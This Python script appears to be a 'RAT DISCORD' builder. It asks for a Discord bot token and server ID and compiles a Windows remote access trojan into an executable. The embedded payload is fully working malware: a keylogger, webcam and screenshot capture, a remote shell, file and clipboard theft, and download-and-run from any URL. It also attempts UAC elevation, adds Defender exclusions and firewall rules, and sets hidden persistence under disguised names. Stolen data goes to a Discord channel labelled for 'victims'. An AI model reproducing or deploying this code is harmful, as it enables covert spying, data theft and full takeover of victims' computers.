# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import os
import sys
import subprocess
import shutil
import ctypes

class Colors:
    @staticmethod
    def purple_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (0 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(255 + (255 - 255) * t)
            colors.append((r, g, b))
        return colors
    
    @staticmethod
    def green_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(0 + (0 - 0) * t)
            g = int(255 + (255 - 255) * t)
            b = int(0 + (255 - 0) * t)
            colors.append((r, g, b))
        return colors
    
    @staticmethod
    def red_to_yellow(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (255 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(0 + (0 - 0) * t)
            colors.append((r, g, b))
        return colors

class Center:
    @staticmethod
    def XCenter(text):
        lines = text.split('\n')
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        centered = []
        for line in lines:
            stripped = line.rstrip()
            if stripped:
                spaces = (terminal_width - len(stripped)) // 2
                centered.append(' ' * spaces + stripped)
            else:
                centered.append('')
        return '\n'.join(centered)

class Colorate:
    @staticmethod
    def Horizontal(color_func, text, step=1):
        lines = text.split('\n')
        total_chars = sum(len(line) for line in lines)
        colors = color_func(total_chars)
        
        result = []
        color_index = 0
        
        for line in lines:
            colored_line = ""
            for char in line:
                if color_index < len(colors):
                    r, g, b = colors[color_index]
                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
                    color_index += step
                else:
                    colored_line += char
            result.append(colored_line)
        
        return '\n'.join(result) + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def Write(text):
    print(text, end='', flush=True)

def set_file_attributes(p):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p, 6)
    except:
        pass

def main():
    clear_screen()
    
    ascii_art = """
██████╗  █████╗ ████████╗    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║   ██║       ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
██╔══██╗██╔══██║   ██║       ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
██║  ██║██║  ██║   ██║       ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
    """
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
    print("\n")
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, "Bot Token : "))
    bot_token = input().strip()
    
    if not bot_token:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nBot Token invalide!\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Verification du Bot Token...\n'))
    try:
        import requests
        headers = {'Authorization': f'Bot {bot_token}'}
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
        if response.status_code != 200:
            Write(Colorate.Horizontal(Colors.green_to_cyan, '\nBot Token invalide! Verifiez votre token.\n'))
            sys.exit()
        bot_data = response.json()
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'Bot connecte: {bot_data.get("username", "Unknown")}\n'))
    except Exception as e:
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'\nErreur de verification: {str(e)}\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Guild ID : '))
    guild_id = input().strip()
    
    if not guild_id:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID invalide!\n'))
        sys.exit()
    
    if not guild_id.isdigit():
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID doit etre un nombre!\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Verification du Guild ID...\n'))
    try:
        response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}', headers=headers, timeout=10)
        if response.status_code != 200:
            Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID invalide ou le bot n\'est pas dans ce serveur!\n'))
            sys.exit()
        guild_data = response.json()
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'Serveur trouve: {guild_data.get("name", "Unknown")}\n'))
    except Exception as e:
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'\nErreur de verification: {str(e)}\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
    n = input().strip() or 'rat'
    
    c = '''import discord
import asyncio
import platform
import os
import pyautogui
import keyboard
import cv2
import winreg
import subprocess
import socket
import requests
import ctypes
import shutil
import pyperclip
import psutil
import comtypes.client
from datetime import datetime

BOT_TOKEN = '{bot_token}'
GUILD_ID = '{guild_id}'

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
client = discord.Client(intents=intents)

control_channel = None
keylogs_channel = None
key_buffer = []
log_file = 'rat.log'

def log_local(message):
    with open(log_file, 'a') as f:
        f.write(f"[{datetime.now()}] {message}\\n")

async def send_embed(channel, title, description=None, file=None, fields=None, color=0x00ff00):
    if channel is None:
        log_local(f"Send error: Channel is None for {title}")
        return
    try:
        embed = discord.Embed(title=title, description=description, color=color)
        if fields:
            for name, value in fields:
                embed.add_field(name=name, value=value, inline=False)
        if file:
            await channel.send(embed=embed, file=file)
        else:
            await channel.send(embed=embed)
    except Exception as e:
        log_local(f"Send error: {e}")

async def log_action(title, description, color=0x00ff00):
    await send_embed(control_channel, title, description=description, color=color)

async def get_ip_info():
    local_ip = socket.gethostbyname(socket.gethostname())
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        ip_data = requests.get('https://ipinfo.io/json', timeout=5).json()
        city = ip_data.get('city', 'Unknown')
        region = ip_data.get('region', 'Unknown')
        country = ip_data.get('country', 'Unknown')
        org = ip_data.get('org', 'Unknown')
        return local_ip, public_ip, city, region, country, org
    except Exception:
        return local_ip, 'Unknown (No Internet)', 'Unknown', 'Unknown', 'Unknown', 'Unknown'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def attempt_uac_elevation():
    if is_admin():
        return True
    try:
        script_path = os.path.abspath(__file__)
        ps_cmd = f'Start-Process python -ArgumentList \\'\\\"{script_path}\\\"\\'  -Verb RunAs'
        subprocess.run(['powershell.exe', '-Command', ps_cmd], capture_output=True, text=True)
        log_local("UAC elevation attempted")
        return False
    except Exception as e:
        log_local(f"UAC elevation failed: {e}")
        return False

async def check_persistence():
    status = []
    rat_path = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, 'SystemService')
        status.append(f"Registry: Active ({value})")
        winreg.CloseKey(key)
    except:
        status.append("Registry: Not found")
    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsSvc.exe')
    status.append(f"Startup Folder: {'Active' if os.path.exists(startup_path) else 'Not found'}")
    try:
        result = subprocess.run('schtasks /query /tn SystemUpdater', shell=True, capture_output=True, text=True)
        status.append("Scheduled Task (admin): Active" if result.returncode == 0 else "Scheduled Task (admin): Not found")
    except:
        status.append("Scheduled Task (admin): Not found")
    try:
        result = subprocess.run('schtasks /query /tn SystemUpdaterNonAdmin', shell=True, capture_output=True, text=True)
        status.append("Scheduled Task (non-admin): Active" if result.returncode == 0 else "Scheduled Task (non-admin): Not found")
    except:
        status.append("Scheduled Task (non-admin): Not found")
    return status

async def process_command(message):
    command = message.content
    if command == '!help':
        help_text = (
            '!help - This list\\n'
            '!screenshot - Grab desktop pic\\n'
            '!webcam - Snap webcam photo\\n'
            '!shell <cmd> - Run system command\\n'
            '!info - Victim details (incl. IP)\\n'
            '!openfile <path> - Open file on victim PC\\n'
            '!download <path> - Download file from victim\\n'
            '!listdir [dir] - List directory contents (default current)\\n'
            '!message <text> - Show message box on victim\\n'
            '!shutdown - Shut down victim PC\\n'
            '!restart - Restart victim PC\\n'
            '!execute <url> - Download and run exe from url\\n'
            '!lock - Lock victim screen\\n'
            '!clipboard - Get clipboard content\\n'
            '!setclipboard <text> - Set clipboard content\\n'
            '!kill <process> - Kill process by name\\n'
            '!sound <url> - Play audio from url\\n'
            '!wallpaper <url> - Set desktop wallpaper from url\\n'
            '!volume <0-100> - Set system volume\\n'
            '!processes - List running processes\\n'
            '!beep <freq> <duration> - Play system beep\\n'
            '!checkboot - Check persistence status\\n'
            '!ping - Check if RAT is online'
        )
        await send_embed(control_channel, "Command List", description=help_text)
    elif command == '!screenshot':
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')
            file = discord.File('screenshot.png')
            await send_embed(control_channel, "Screenshot", file=file)
            os.remove('screenshot.png')
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Screenshot failed: {e}", color=0xff0000)
    elif command == '!webcam':
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', frame)
                file = discord.File('webcam.jpg')
                await send_embed(control_channel, "Webcam Pic", file=file)
                os.remove('webcam.jpg')
            else:
                await send_embed(control_channel, "Error", description="Webcam: No frame captured", color=0xff0000)
            cap.release()
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Webcam failed: {e}", color=0xff0000)
    elif command.startswith('!shell '):
        cmd = command[7:]
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout or result.stderr or "No output"
            await send_embed(control_channel, "Shell Output", description=f"```\\n{output[:1900]}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Shell failed: {e}", color=0xff0000)
    elif command == '!info':
        local_ip, public_ip, city, region, country, org = await get_ip_info()
        fields = [
            ("Hostname", platform.node()),
            ("User", os.getlogin()),
            ("OS", f"{platform.system()} {platform.release()}"),
            ("Arch", platform.machine()),
            ("Local IP", local_ip),
            ("Public IP", public_ip),
            ("City", city),
            ("Region", region),
            ("Country", country),
            ("Org", org),
            ("Admin", str(is_admin()))
        ]
        await send_embed(control_channel, "Victim Info", fields=fields)
    elif command.startswith('!openfile '):
        path = command[10:].strip()
        try:
            subprocess.Popen(path, shell=True)
            await send_embed(control_channel, "Success", description=f"Opened: {path}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Open failed: {e}", color=0xff0000)
    elif command.startswith('!download '):
        path = command[10:].strip()
        try:
            if not os.path.exists(path):
                raise FileNotFoundError("File not found")
            size = os.path.getsize(path)
            if size > 8 * 1024 * 1024:
                raise ValueError("File too large (>8MB)")
            file = discord.File(path)
            await send_embed(control_channel, "Downloaded File", file=file)
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Download failed: {e}", color=0xff0000)
    elif command.startswith('!listdir'):
        dir_path = command[8:].strip() or '.'
        try:
            files = os.listdir(dir_path)
            file_list = '\\n'.join(files[:100])
            await send_embed(control_channel, f"Directory Listing: {dir_path}", description=f"```\\n{file_list}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Listdir failed: {e}", color=0xff0000)
    elif command.startswith('!message '):
        text = command[9:]
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "System Update", 0)
            await send_embed(control_channel, "Success", description="Message shown")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Message failed: {e}", color=0xff0000)
    elif command == '!shutdown':
        try:
            os.system('shutdown /s /t 0')
            await send_embed(control_channel, "Executing", description="Shutting down victim PC")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Shutdown failed: {e}", color=0xff0000)
    elif command == '!restart':
        try:
            os.system('shutdown /r /t 0')
            await send_embed(control_channel, "Executing", description="Restarting victim PC")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Restart failed: {e}", color=0xff0000)
    elif command.startswith('!execute '):
        url = command[9:].strip()
        try:
            response = requests.get(url, stream=True)
            if response.status_code != 200:
                raise ValueError("Bad URL")
            save_path = os.path.join(os.environ['TEMP'], 'sysupdate.exe')
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'SysUpdate', 0, winreg.REG_SZ, f'"{save_path}"')
            winreg.CloseKey(key)
            subprocess.Popen(save_path, shell=True)
            await send_embed(control_channel, "Success", description=f"Executed from {url} as {save_path}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Execute failed: {e}", color=0xff0000)
    elif command == '!lock':
        try:
            ctypes.windll.user32.LockWorkStation()
            await send_embed(control_channel, "Success", description="Screen locked")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Lock failed: {e}", color=0xff0000)
    elif command == '!clipboard':
        try:
            text = pyperclip.paste()
            await send_embed(control_channel, "Clipboard Content", description=f"```\\n{text[:1900]}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Clipboard get failed: {e}", color=0xff0000)
    elif command.startswith('!setclipboard '):
        text = command[14:]
        try:
            pyperclip.copy(text)
            await send_embed(control_channel, "Success", description="Clipboard set")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Clipboard set failed: {e}", color=0xff0000)
    elif command.startswith('!kill '):
        process = command[6:].strip()
        try:
            killed = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process.lower():
                    proc.kill()
                    killed = True
            if killed:
                await send_embed(control_channel, "Success", description=f"Killed process: {process}")
            else:
                await send_embed(control_channel, "Error", description=f"Process not found: {process}", color=0xff0000)
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Kill failed: {e}", color=0xff0000)
    elif command.startswith('!sound '):
        url = command[7:].strip()
        try:
            response = requests.get(url, stream=True)
            if response.status_code != 200:
                raise ValueError("Bad URL")
            save_path = os.path.join(os.environ['TEMP'], 'sound.wav')
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            subprocess.Popen(['start', save_path], shell=True)
            await send_embed(control_channel, "Success", description=f"Playing sound from {url}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Sound failed: {e}", color=0xff0000)
    elif command.startswith('!wallpaper '):
        url = command[11:].strip()
        try:
            response = requests.get(url, stream=True)
            if response.status_code != 200:
                raise ValueError("Bad URL")
            save_path = os.path.join(os.environ['TEMP'], 'wallpaper.jpg')
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, save_path, 3)
            await send_embed(control_channel, "Success", description=f"Wallpaper set from {url}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Wallpaper failed: {e}", color=0xff0000)
    elif command.startswith('!volume '):
        vol = command[8:].strip()
        try:
            vol = int(vol)
            if not 0 <= vol <= 100:
                raise ValueError("Volume must be 0-100")
            volume = comtypes.client.CreateObject('MMDeviceApi.MMDeviceEnumerator').GetDefaultAudioEndpoint(0, 0)
            volume.GetMasterVolumeLevelScalar()
            volume.SetMasterVolumeLevelScalar(vol / 100.0, None)
            await send_embed(control_channel, "Success", description=f"Volume set to {vol}%")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Volume failed: {e}", color=0xff0000)
    elif command == '!processes':
        try:
            processes = [proc.info['name'] for proc in psutil.process_iter(['name'])][:50]
            proc_list = '\\n'.join(processes)
            await send_embed(control_channel, "Running Processes", description=f"```\\n{proc_list}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Processes failed: {e}", color=0xff0000)
    elif command.startswith('!beep '):
        try:
            freq, dur = map(int, command[6:].split())
            ctypes.windll.kernel32.Beep(freq, dur)
            await send_embed(control_channel, "Success", description=f"Beep played: {freq}Hz, {dur}ms")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"Beep failed: {e}", color=0xff0000)
    elif command == '!checkboot':
        status = await check_persistence()
        await send_embed(control_channel, "Persistence Status", description='\\n'.join(status))
    elif command == '!ping':
        await send_embed(control_channel, "Pong!", description="RAT is online")

def add_exclusions():
    successes = []
    fails = []
    rat_path = os.path.abspath(__file__)
    try:
        cmd = f'powershell.exe -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \\'{os.path.dirname(rat_path)}\\'; Add-MpPreference -ExclusionProcess \\'{os.path.basename(rat_path)}\\'"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Defender exclusion (PowerShell) added")
        else:
            fails.append(f"Defender exclusion (PowerShell) failed: {result.stderr[:200]}")
    except Exception as e:
        fails.append(f"Defender exclusion (PowerShell) failed: {e}")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, os.path.basename(rat_path), 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)
        successes.append("Defender exclusion (Registry) added")
    except Exception as e:
        fails.append(f"Defender exclusion (Registry) failed: {e}")
    try:
        cmd = f'netsh advfirewall firewall add rule name="SystemService" dir=in action=allow program="{rat_path}" enable=yes'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Firewall rule (inbound) added")
        else:
            fails.append(f"Firewall rule (inbound) failed: {result.stderr[:200]}")
    except Exception as e:
        fails.append(f"Firewall rule (inbound) failed: {e}")
    try:
        av_procs = ['avastsvc.exe', 'nortonsecurity.exe', 'mcafeemcshield.exe']
        found_avs = [p.info['name'] for p in psutil.process_iter(['name']) if p.info['name'].lower() in av_procs]
        if found_avs:
            successes.append(f"Detected third-party AVs: {', '.join(found_avs)}")
    except Exception as e:
        fails.append(f"AV detection failed: {e}")
    return successes, fails

def add_persistences():
    successes = []
    fails = []
    rat_path = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, f'"{rat_path}"')
        winreg.CloseKey(key)
        successes.append("Registry persistence added")
    except Exception as e:
        fails.append(f"Registry persistence failed: {e}")
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_path = os.path.join(startup_folder, 'WindowsSvc.exe')
        shutil.copy(rat_path, startup_path)
        successes.append("Startup folder persistence added")
    except Exception as e:
        fails.append(f"Startup folder persistence failed: {e}")
    try:
        cmd = f'schtasks /create /tn "SystemUpdater" /tr "{rat_path}" /sc onlogon /rl highest /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Scheduled Task persistence added")
        else:
            fails.append(f"Scheduled Task persistence failed: {result.stderr[:200]}")
    except Exception as e:
        fails.append(f"Scheduled Task persistence failed: {e}")
    try:
        cmd = f'schtasks /create /tn "SystemUpdaterNonAdmin" /tr "{rat_path}" /sc onlogon /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Scheduled Task (non-admin) persistence added")
        else:
            fails.append(f"Scheduled Task (non-admin) persistence failed: {result.stderr[:200]}")
    except Exception as e:
        fails.append(f"Scheduled Task (non-admin) persistence failed: {e}")
    return successes, fails

async def keylogger():
    while True:
        if key_buffer:
            keys = ''.join(key_buffer)[:1900]
            if keylogs_channel:
                await send_embed(keylogs_channel, "Key Logs", description=f"```\\n{keys}\\n```")
            else:
                log_local(f"Key Logs: {keys}")
            key_buffer.clear()
        await asyncio.sleep(30)

def start_keylogger():
    def on_key(event):
        key = event.name
        if key == 'enter':
            key_buffer.append('\\n[ENTER]\\n')
        elif key == 'backspace':
            key_buffer.append('[BACKSPACE]')
        elif key == 'tab':
            key_buffer.append('[TAB]')
        elif len(key) == 1:
            key_buffer.append(key)

    keyboard.on_press(on_key)

@client.event
async def on_ready():
    global control_channel, keylogs_channel
    for attempt in range(5):
        try:
            guild = client.get_guild(int(GUILD_ID))
            if not guild:
                raise ValueError("Guild not found")
            break
        except Exception as e:
            log_local(f"Connection attempt {attempt + 1} failed: {e}")
            await asyncio.sleep(2 ** attempt)
    else:
        log_local("Failed to connect to Discord after 5 attempts")
        return

    if not is_admin():
        await log_action("UAC Prompt", "Not admin, attempting elevation...")
        if not attempt_uac_elevation():
            await log_action("UAC Fail", "Elevation failed, running as non-admin", color=0xff0000)

    rat_path = os.path.abspath(__file__)
    new_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
    if 'rat' in os.path.basename(rat_path).lower() and not os.path.exists(new_path):
        try:
            shutil.copy(rat_path, new_path)
            await log_action("Success", f"Copied self to {new_path}")
        except Exception as e:
            await log_action("Error", f"Self-copy failed: {e}", color=0xff0000)

    pc_name = platform.node()
    try:
        category = await guild.create_category(pc_name)
        control_channel = await guild.create_text_channel('control', category=category)
        keylogs_channel = await guild.create_text_channel('keylogs', category=category)
    except Exception as e:
        log_local(f"Channel creation failed: {e}")
        return

    local_ip, public_ip, city, region, country, org = await get_ip_info()
    fields = [
        ("Hostname", pc_name),
        ("User", os.getlogin()),
        ("OS", f"{platform.system()} {platform.release()}"),
        ("Local IP", local_ip),
        ("Public IP", public_ip),
        ("City", city),
        ("Region", region),
        ("Country", country),
        ("Org", org),
        ("Admin", str(is_admin()))
    ]
    await send_embed(control_channel, "Victim Online!", fields=fields)
    exc_s, exc_f = add_exclusions()
    if exc_s:
        await log_action("Exclusions Success", '\\n'.join(exc_s))
    if exc_f:
        await log_action("Exclusions Fail", '\\n'.join(exc_f), color=0xff0000)

    per_s, per_f = add_persistences()
    if per_s:
        await log_action("Persistences Success", '\\n'.join(per_s))
    if per_f:
        await log_action("Persistences Fail", '\\n'.join(per_f), color=0xff0000)

    asyncio.create_task(keylogger())

@client.event
async def on_message(message):
    if control_channel and message.channel.id == control_channel.id and message.author != client.user and message.content.startswith('!'):
        await process_command(message)

async def main():
    start_keylogger()
    for attempt in range(5):
        try:
            await client.start(BOT_TOKEN)
            break
        except Exception as e:
            log_local(f"Client start attempt {attempt + 1} failed: {e}")
            await asyncio.sleep(2 ** attempt)
    else:
        log_local("Failed to start Discord client after 5 attempts")

if __name__ == "__main__":
    asyncio.run(main())'''
    
    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'
    
    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
    
    with open(t, 'w', encoding='utf-8') as f:
        f.write(c.replace('{bot_token}', bot_token).replace('{guild_id}', guild_id))
    
    set_file_attributes(t)
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
    
    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
        sys.exit()
    
    r = subprocess.run([
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--hidden-import', 'discord',
        '--hidden-import', 'pyautogui',
        '--hidden-import', 'keyboard',
        '--hidden-import', 'cv2',
        '--hidden-import', 'pyperclip',
        '--hidden-import', 'psutil',
        '--hidden-import', 'comtypes',
        '--noconfirm',
        '--clean',
        t
    ], capture_output=True, text=True)
    
    if r.returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
        print(r.stderr[:500])
        sys.exit()
    
    shutil.move(f'dist/{n}_temp.exe', e)
    
    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass
    
    print()
    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
    print("\n")
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
    print()

if __name__ == "__main__":
    main()

